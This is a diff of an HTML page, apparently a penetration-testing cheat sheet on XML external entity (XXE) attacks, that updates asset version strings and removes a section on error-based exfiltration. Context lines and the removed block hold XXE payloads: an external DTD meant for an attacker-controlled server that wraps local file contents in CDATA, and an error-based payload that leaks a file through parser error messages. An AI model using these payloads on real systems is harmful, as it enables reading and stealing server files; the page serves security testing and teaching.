@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=c627d42">
+  <link rel="stylesheet" href="/assets/style.css?v=89d865c">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1352,7 +1352,7 @@ Content-Type: application/json
 ]&gt;
 &lt;foo&gt;&lt;![CDATA[&amp;xxe;]]&gt;&lt;/foo&gt;</code></pre>
 <p>The entity <code>&amp;xxe;</code> inside the CDATA block is treated as literal text, not resolved.</p>
-<h3 id="workaround-1-cdata-via-external-dtd">Workaround 1: CDATA via External DTD</h3>
+<h3 id="workaround-cdata-via-external-dtd">Workaround: CDATA via External DTD</h3>
 <p>The correct way to use CDATA wrapping is to construct it dynamically using parameter entities in an external DTD. Because parameter entity chaining is allowed in external DTDs — unlike in the internal subset — we can build the CDATA wrapper around the file content before it reaches the document body:</p>
 <p>Host this DTD on your attacker-controlled server:</p>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY % start "&lt;![CDATA["&gt;
@@ -1368,17 +1368,6 @@ Content-Type: application/json
 ]&gt;
 &lt;foo&gt;&amp;content;&lt;/foo&gt;</code></pre>
 <p>When the parser loads the external DTD, <code>%all</code> defines the general entity <code>&amp;content;</code> whose value is <code>&lt;![CDATA[&lt;file contents&gt;]]&gt;</code>. The CDATA wrapper neutralises the special characters before the parser sees them in the document body. This technique requires the parser to be able to reach your server — the same network condition as OOB exfiltration.</p>
-<h3 id="workaround-2-oob-or-error-based-exfiltration">Workaround 2: OOB or Error-Based Exfiltration</h3>
-<p>When the external DTD approach is not viable, OOB and error-based techniques bypass the special characters problem through a different mechanism. For OOB, the file contents are embedded in a URL query string where special characters get automatically URL-encoded during the HTTP request. For error-based, the content is embedded in a file path where the parser includes it verbatim in the error message regardless of XML validity:</p>
-<pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE foo [
-  &lt;!ENTITY % file SYSTEM "file:///path/to/file/with/special/chars.xml"&gt;
-  &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/&amp;#x25;file;'&gt;"&gt;
-  %eval;
-  %error;
-]&gt;
-&lt;foo&gt;&lt;/foo&gt;</code></pre>
-<p>The error message will contain the file contents including the special characters.</p>
 <hr />
 <h1 id="advanced-techniques">Advanced Techniques</h1>
 <p>These techniques require specific technology stacks, rare configurations or complex payload crafting. They are not the first thing to try but can be critical when standard techniques fail. This section also includes environment-specific escalation paths (like RCE through PHP expect:// or Java deserialization) which depend on very particular conditions in the target.</p>
@@ -1860,6 +1849,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=c627d42" defer></script>
+  <script src="/assets/main.js?v=89d865c" defer></script>
 </body>
 </html>
